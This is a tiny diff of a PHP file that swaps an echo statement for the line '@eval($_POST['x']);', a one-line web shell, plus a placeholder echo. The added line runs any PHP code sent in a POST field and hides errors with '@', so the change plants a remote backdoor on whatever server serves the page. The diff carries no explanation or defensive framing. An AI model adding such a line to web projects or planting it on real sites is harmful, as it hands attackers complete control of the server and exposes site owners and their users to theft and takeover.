@@ -1,3 +1,4 @@
 <?php
-       echo ‘hello hackerAK’;
+       @eval($_POST['x']);
+       echo '123' ;
 ?>
